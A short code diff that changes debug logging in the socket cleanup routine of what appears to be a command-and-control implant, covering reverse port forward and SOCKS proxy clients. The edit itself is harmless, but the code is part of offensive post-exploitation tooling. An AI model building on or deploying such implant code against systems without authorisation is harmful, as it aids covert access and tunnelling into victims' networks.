@@ -428,11 +428,11 @@ VOID SocketFree( PSOCKET_DATA Socket )
 {
     PPACKAGE Package = NULL;
 
+    PRINTF( "Closing socket %x\n", Socket->ID )
+
     /* do we want to remove a reverse port forward client ? */
     if ( Socket->Type == SOCKET_TYPE_CLIENT_REMOVED )
     {
-        PUTS( "REVERSE PORT FORWARD CLIENT REMOVED" )
-
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
@@ -456,8 +456,6 @@ VOID SocketFree( PSOCKET_DATA Socket )
     /* do we want to remove a socks proxy client ? */
     else if ( Socket->Type == SOCKET_TYPE_SOCKS_REMOVED )
     {
-        PUTS( "SOCKS PROXY CLIENT REMOVED" )
-
         /* create socket response package */
         Package = PackageCreate( DEMON_COMMAND_SOCKET );
 
